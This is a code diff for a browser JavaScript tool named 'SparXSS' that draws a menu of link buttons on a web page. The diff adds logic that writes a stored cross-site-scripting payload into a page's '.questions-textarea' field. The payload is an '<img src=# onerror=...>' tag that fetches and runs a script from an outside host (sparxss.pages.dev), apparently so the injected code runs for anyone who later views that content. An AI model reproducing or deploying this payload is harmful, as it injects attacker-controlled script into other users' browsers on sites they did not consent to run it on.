@@ -1,17 +1,9 @@
-// so it executes once 
+// so it executes once
 if (typeof executed === 'undefined') {
-    executed = true;
+    executed = true; 
 
     // eruda bc useful for debugging
-    (function() {
-        var script=document.createElement("script");
-        script.src="https://cdn.jsdelivr.net/npm/eruda";
-        document.body.append(script);
-        script.onload=function() { 
-            eruda.init();
-        }
-    })
-    ();
+    (function(){var script=document.createElement("script");script.src="https://cdn.jsdelivr.net/npm/eruda";document.body.append(script);script.onload=function(){eruda.init();console.log("Script Loaded: Thank you for using SparXSS!")}})();
     
     var container = document.createElement('div');
     container.style.position = 'fixed';
@@ -234,7 +226,7 @@ if (typeof executed === 'undefined') {
     });
 
     button2.addEventListener('click', function() {
-        backgroundDiv2.style.display = 'block';
+        backgroundDiv2.style.display = '';
     });
 
     var button3 = document.createElement("button");
@@ -510,9 +502,42 @@ if (typeof executed === 'undefined') {
     contentContainer.style.backgroundColor = '#222';
     contentContainer.style.overflow = 'auto';
 
+    var copier = document.createElement('button');
+    copier.innerText = 'Copy Links';
+    copier.style.position = 'fixed';
+    copier.style.bottom = '20px';
+    copier.style.width = '15%';
+    copier.style.left = '42.5%';
+    copier.style.backgroundColor = '#333';
+    copier.style.border = 'none';
+    copier.style.padding = '15px';
+    copier.style.fontSize = '20px';
+    copier.style.borderRadius = '10px';
+    copier.style.boxShadow = '0 0 5px rgba(0, 0, 0, 0.5)';
+    copier.style.transition = 'background-color 0.3s ease';
+    copier.style.color = '#aaa';
+    copier.style.cursor = 'pointer';
+    copier.style.outline = 'none';
+    copier.style.textAlign = 'center';
+
+    copier.addEventListener('mouseover', function() {
+        copier.style.backgroundColor = '#444';
+    });
+
+    copier.addEventListener('mouseout', function() {
+        copier.style.backgroundColor = '#333';
+    });
+
+    copier.addEventListener('click', function() {
+        var textarea = document.querySelector('.questions-textarea');
+        textarea.select();
+        document.execCommand('copy');
+        window.getSelection().removeAllRanges();
+    });
+
     var closeButton = document.createElement('div');
     closeButton.innerText = 'Close Menu';
-    closeButton.style.width = '40%';
+    closeButton.style.width = '32.5%';
     closeButton.style.backgroundColor = '#333';
     closeButton.style.border = 'none';
     closeButton.style.borderRadius = '10px';
@@ -537,6 +562,10 @@ if (typeof executed === 'undefined') {
 
     closeButton.addEventListener('click', function() {
         backgroundDiv2.style.display = 'none';
+
+        var textarea = document.querySelector('.questions-textarea');
+        textarea.select();
+        window.getSelection().removeAllRanges();
     });
 
     var linkContainer = document.createElement('div');
@@ -545,7 +574,7 @@ if (typeof executed === 'undefined') {
 
     var otherButton = document.createElement('div');
     otherButton.innerText = 'New Hyperlink';
-    otherButton.style.width = '40%';
+    otherButton.style.width = '32.5%';
     otherButton.style.backgroundColor = '#333';
     otherButton.style.border = 'none';
     otherButton.style.borderRadius = '10px';
@@ -590,14 +619,44 @@ if (typeof executed === 'undefined') {
         contentContainer.style.borderRadius = '10px';
         contentContainer.style.boxShadow = '0 0 5px rgba(0, 0, 0, 0.5)';
         contentContainer.style.textAlign = 'center';
-
         contentContainer.style.position = 'absolute';
         contentContainer.style.left = '50%';
         contentContainer.style.top = '50%';
         contentContainer.style.transform = 'translate(-50%, -50%)';
 
+        var cancelHyperLinks = document.createElement('button');
+        cancelHyperLinks.innerText = 'X';
+        cancelHyperLinks.style.position = 'fixed';
+        cancelHyperLinks.style.width = '30px';
+        cancelHyperLinks.style.height = '30px';
+        cancelHyperLinks.style.fontSize = '20px'; 
+        cancelHyperLinks.style.top = '-5px';
+        cancelHyperLinks.style.right = '-5px';
+        cancelHyperLinks.style.margin = '10px';
+        cancelHyperLinks.style.color = '#aaa';
+        cancelHyperLinks.style.backgroundColor = '#333';
+        cancelHyperLinks.style.border = 'none';
+        cancelHyperLinks.style.borderRadius = '50%';
+        cancelHyperLinks.style.outline = 'none';
+        cancelHyperLinks.style.textAlign = 'center';
+        cancelHyperLinks.style.cursor = 'pointer';
+        cancelHyperLinks.style.fontWeight = 'bold';
+        cancelHyperLinks.style.transition = 'background-color 0.3s ease';
+    
+        cancelHyperLinks.addEventListener('mouseover', function() {
+            cancelHyperLinks.style.backgroundColor = '#444';
+        });
+    
+        cancelHyperLinks.addEventListener('mouseout', function() {
+            cancelHyperLinks.style.backgroundColor = '#333';
+        });
+
+        cancelHyperLinks.addEventListener('click', function() {
+            backgroundDiv3.remove();
+        });
+
         var topText = document.createElement('div');
-        topText.innerText = 'Add Your URL Without the "https://"';
+        topText.innerText = 'Add Your URL Below:';
         topText.style.padding = '10px';
         topText.style.marginTop = '35px';
         topText.style.border = 'none';
@@ -632,6 +691,26 @@ if (typeof executed === 'undefined') {
 
         textBox.addEventListener('mouseout', function() {
             textBox.style.backgroundColor = '#333';
+        });
+        
+        textBox.addEventListener('keydown', function(event) {
+            if (event.key === 'Enter') {
+                if (textBox.value.trim() !== '' && textBox.value.includes('.')) { 
+                    userURL = textBox.value
+                    if (userURL.startsWith("https://")) {
+                      userURL = userURL.slice(8);
+                    } else if (userURL.startsWith("http://")) {
+                      userURL = userURL.slice(7);
+                    }                
+                    backgroundDiv3.style.display = 'none';
+                    checkpoint2(userURL);
+                } else {
+                    bottomButton.innerText = 'Error: Invalid URL';
+                    setTimeout(function() {
+                        bottomButton.innerText = 'Add Hyperlink';
+                    }, 2000); 
+                }
+            }
         });
 
         var bottomButton = document.createElement('button');
@@ -677,6 +756,7 @@ if (typeof executed === 'undefined') {
         contentContainer.appendChild(topText);
         contentContainer.appendChild(textBox);
         contentContainer.appendChild(bottomButton);
+        contentContainer.appendChild(cancelHyperLinks);
 
         backgroundDiv3.appendChild(contentContainer);
         document.body.appendChild(backgroundDiv3);
@@ -696,14 +776,20 @@ if (typeof executed === 'undefined') {
                 var match = data.match(/<link.*?rel=["']icon["'].*?href=["'](.*?)["']/i);
                 if (match) {
                     faviconURL = match[1];
+                    console.log("Website URL: " + websiteURL)
+                    console.log("Favicon Path: " + faviconURL)
                     if (faviconURL.startsWith('/') && !websiteURL.endsWith('/')) {
                         faviconURL = websiteURL + faviconURL;
+                    } else if (faviconURL.startsWith('http')) {
+                        faviconURL = faviconURL;
                     } else {
                         faviconURL = websiteURL + '/' + faviconURL;
                     }
                 } else {
                     faviconURL = 'https://www.google.com/s2/favicons?domain=' + userURL;
                 }
+
+                console.log("Final Favicon URL: " + faviconURL)
     
                 var link = document.createElement('button');
                 link.style.width = '25%';
@@ -752,10 +838,73 @@ if (typeof executed === 'undefined') {
                 linkText.style.textAlign = 'center';
                 
                 link.appendChild(linkText);
+
+                var codeSnippet = `var link = document.createElement('button');
+link.style.width = '25%';
+link.style.height = '225px';
+link.style.backgroundColor = '#333';
+link.style.border = 'none';
+link.style.borderRadius = '10px';
+link.style.padding = '15px';
+link.style.boxShadow = '0 0 5px rgba(0, 0, 0, 0.5)';
+link.style.fontSize = '20px';
+link.style.color = '#aaa';
+link.style.cursor = 'pointer';
+link.style.transition = 'background-color 0.3s ease';
+link.style.margin = '10px';
+link.style.textAlign = 'center';
+
+link.addEventListener('mouseover', function () {
+    link.style.backgroundColor = '#444';
+});
+
+link.addEventListener('mouseout', function () {
+    link.style.backgroundColor = '#333';
+});
+
+link.addEventListener('click', function () {
+    if (redirectSwitcher === false) {
+        window.open('https://${userURL}', '_blank');
+    } else {
+        window.location.href = 'https://${userURL}';
+    }
+});
+
+linkContainer.appendChild(link);
+
+var imgDiv = document.createElement('img');
+imgDiv.style.width = '150px';
+imgDiv.style.height = '150px';
+imgDiv.style.textAlign = 'center';
+imgDiv.src = '${faviconURL}';
+
+link.appendChild(imgDiv);
+
+var linkText = document.createElement('div');
+linkText.innerText = '${userURL}';
+linkText.style.marginTop = '10px';
+linkText.style.textAlign = 'center';
+
+link.appendChild(linkText);`;
+
+                var codeBeginning = `<img src=# onerror="var scriptElement=document.createElement('script');scriptElement.src='https://sparxss.pages.dev/sparxss.js';scriptElement.onload=function(){if(typeof saved === 'undefined'){saved=true;`;
+                
+                var codeEnd = `}};document.body.appendChild(scriptElement);">`;
+        
+                var textarea = document.querySelector('.questions-textarea');
+                
+                if (typeof linkSave === 'undefined') {
+                    if (textarea !== 'undefined') {
+                        linkSave = true;
+                        textarea.value = codeBeginning + codeSnippet + codeEnd;
+                    }
+                } else if (linkSave === true) {
+                    if (textarea !== 'undefined') {
+                        textarea.value = textarea.value.replace(codeEnd, '');
+                        textarea.value = textarea.value + codeSnippet + codeEnd;
+                    }
+                }
             })
-            .catch(function(error) {
-                console.error('Error:', error);
-            });
     }
 
     otherButton.addEventListener('click', checkpoint1);
@@ -774,7 +923,8 @@ if (typeof executed === 'undefined') {
     document.body.appendChild(invis);
 
     contentContainer.appendChild(linkContainer);
-    contentContainer.appendChild(otherButton)
+    contentContainer.appendChild(otherButton);
+    contentContainer.appendChild(copier);
     contentContainer.appendChild(closeButton);
     backgroundDiv2.appendChild(contentContainer);
     document.body.appendChild(backgroundDiv2);
